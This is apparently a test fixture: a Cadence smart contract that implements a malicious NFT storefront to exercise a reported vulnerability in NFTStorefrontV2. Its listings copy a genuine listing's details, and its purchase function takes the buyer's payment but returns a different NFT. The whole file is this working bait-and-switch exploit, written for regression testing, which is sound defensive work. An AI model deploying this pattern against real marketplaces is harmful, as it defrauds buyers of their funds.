import "NFTStorefrontV2"
import "NonFungibleToken"
import "FungibleToken"
import "FungibleTokenMetadataViews"

/// Thanks to Austin Kline - https://twitter.com/austin_flowty
/// for discovering and reporting the vulnerability that this contract tests
///
/// This is a test contract that implements a malicious storefront
/// to try an sell an NFT with a different ID in the place
/// of a different listing
///
/// There is a test in NFTStorefrontV2_test.cdc that tests this case

access(all) contract MaliciousStorefrontV2 {
    access(all) let StorefrontStoragePath: StoragePath
    access(all) let StorefrontPublicPath: PublicPath

    access(all) resource Storefront: NFTStorefrontV2.StorefrontPublic {
        access(self) let storefrontCap: Capability<auth(NFTStorefrontV2.CreateListing, NFTStorefrontV2.RemoveListing) &NFTStorefrontV2.Storefront>
        access(self) let listings: @{UInt64: Listing}


        access(all) view fun getListingIDs(): [UInt64] {
            return self.storefrontCap.borrow()!.getListingIDs()
        }

        access(all) fun getDuplicateListingIDs(nftType: Type, nftID: UInt64, listingID: UInt64): [UInt64] {
            return self.storefrontCap.borrow()!.getDuplicateListingIDs(nftType: nftType, nftID: nftID, listingID: listingID)
        }

        access(all) view fun borrowListing(listingResourceID: UInt64): &{NFTStorefrontV2.ListingPublic}? {
            return &self.listings[listingResourceID]
        }

        access(all) fun cleanupExpiredListings(fromIndex: UInt64, toIndex: UInt64) {
            return self.storefrontCap.borrow()!.cleanupExpiredListings(fromIndex: fromIndex, toIndex: toIndex)
        }

        access(contract) fun cleanup(listingResourceID: UInt64) {
            return
        }

        access(all) fun getExistingListingIDs(nftType: Type, nftID: UInt64): [UInt64] {
            return self.storefrontCap.borrow()!.getExistingListingIDs(nftType: nftType, nftID: nftID)
        }

        access(all) fun cleanupPurchasedListings(listingResourceID: UInt64) {
            return self.storefrontCap.borrow()!.cleanupPurchasedListings(listingResourceID: listingResourceID)
        }

        access(all) fun cleanupGhostListings(listingResourceID: UInt64) {
            return self.storefrontCap.borrow()!.cleanupGhostListings(listingResourceID: listingResourceID)
        }

        access(NFTStorefrontV2.CreateListing) fun createListing(
            nftProviderCapability: Capability<auth(NonFungibleToken.Withdraw) &{NonFungibleToken.Collection}>,
            nftType: Type,
            nftID: UInt64,
            maliciousNftId: UInt64,
            salePaymentVaultType: Type,
            saleCuts: [NFTStorefrontV2.SaleCut],
            marketplacesCapability: [Capability<&{FungibleToken.Receiver}>]?,
            customID: String?,
            commissionAmount: UFix64,
            expiry: UInt64
        ): UInt64 {
            let storefront = self.storefrontCap.borrow()!
            let listingId = storefront.createListing(
                nftProviderCapability: nftProviderCapability,
                nftType: nftType,
                nftID: nftID,
                salePaymentVaultType: salePaymentVaultType,
                saleCuts: saleCuts,
                marketplacesCapability: marketplacesCapability,
                customID: customID,
                commissionAmount: commissionAmount,
                expiry: expiry
            )

            let maliciouslisting <- create Listing(
                storefrontCap: self.storefrontCap,
                listingResourceID: listingId,
                nftId: maliciousNftId,
                provider: nftProviderCapability
            )

            destroy self.listings.insert(key: listingId, <-maliciouslisting)

            return listingId
        }

        init(storefrontCap: Capability<auth(NFTStorefrontV2.CreateListing, NFTStorefrontV2.RemoveListing) &NFTStorefrontV2.Storefront>) {
            self.storefrontCap = storefrontCap
            self.listings <- {}
        }
    }

    access(all) resource Listing: NFTStorefrontV2.ListingPublic {
        access(self) let storefrontCap: Capability<&NFTStorefrontV2.Storefront>

        // this id much match the id of the listing being impersonated
        access(self) let listingResourceID: UInt64

        // this is the id of the nft we are returning instead of the one that a user thinks is being purchased.
        access(self) let nftId: UInt64

        access(contract) let provider: Capability<auth(NonFungibleToken.Withdraw) &{NonFungibleToken.Provider, NonFungibleToken.CollectionPublic}>

        access(all) fun borrowNFT(): &{NonFungibleToken.NFT}? {
            return self.storefrontCap.borrow()!.borrowListing(listingResourceID: self.listingResourceID)!.borrowNFT()
        }

        access(all) view fun getDetails(): NFTStorefrontV2.ListingDetails {
            return self.storefrontCap.borrow()!.borrowListing(listingResourceID: self.listingResourceID)!.getDetails()
        }

        access(all) view fun getAllowedCommissionReceivers(): [Capability<&{FungibleToken.Receiver}>]? {
            return self.storefrontCap.borrow()!.borrowListing(listingResourceID: self.listingResourceID)!.getAllowedCommissionReceivers()
        }

        access(all) view fun hasListingBecomeGhosted(): Bool {
            return self.storefrontCap.borrow()!.borrowListing(listingResourceID: self.listingResourceID)!.hasListingBecomeGhosted()
        }

        // purchase will return the "wrong" nft
        access(all) fun purchase(
            payment: @{FungibleToken.Vault}, 
            commissionRecipient: Capability<&{FungibleToken.Receiver}>?,
        ): @{NonFungibleToken.NFT} {
            let details = self.getDetails()
            assert(payment.balance == details.salePrice, message: "incorrect payment amount")
            assert(payment.getType() == details.salePaymentVaultType, message: "incorrect payment token type")

            let ftVaultData = payment.resolveView(Type<FungibleTokenMetadataViews.FTVaultData>())! as! FungibleTokenMetadataViews.FTVaultData
            if let vault = MaliciousStorefrontV2.account.storage.borrow<&{FungibleToken.Vault}>(from: ftVaultData.storagePath) {
                vault.deposit(from: <- payment)
            } else {
                MaliciousStorefrontV2.account.storage.save(<-payment, to: ftVaultData.storagePath)
            }

            let nft <- self.provider.borrow()!.withdraw(withdrawID: self.nftId)
            return <- nft
        }

        init(
            storefrontCap: Capability<auth(NFTStorefrontV2.CreateListing, NFTStorefrontV2.RemoveListing) &NFTStorefrontV2.Storefront>,
            listingResourceID: UInt64,
            nftId: UInt64,
            provider: Capability<auth(NonFungibleToken.Withdraw) &{NonFungibleToken.Provider, NonFungibleToken.CollectionPublic}>
        ) {
            pre {
                provider.check(): "invalid provider capability"
                storefrontCap.check(): "invalid storefront cap"
            }

            let listing = storefrontCap.borrow()!.borrowListing(listingResourceID: listingResourceID) ?? panic("failed to borrow get impersonated listing")
            let details = listing.getDetails()

            self.storefrontCap = storefrontCap
            self.listingResourceID = listingResourceID
            self.nftId = nftId
            self.provider = provider

            assert(provider.borrow()!.borrowNFT(self.nftId) != nil, message: "could not borrow nftID")
            assert(details.nftID != self.nftId, message: "must not return the same id as the original listing")
        }
    }

    access(all) fun createStorefront(storefrontCap: Capability<auth(NFTStorefrontV2.CreateListing, NFTStorefrontV2.RemoveListing) &NFTStorefrontV2.Storefront>): @Storefront {
        return <- create Storefront(storefrontCap: storefrontCap)
    }

    init() {
        self.StorefrontStoragePath = /storage/NFTStorefrontV2Malicious
        self.StorefrontPublicPath = /public/NFTStorefrontV2
    }
}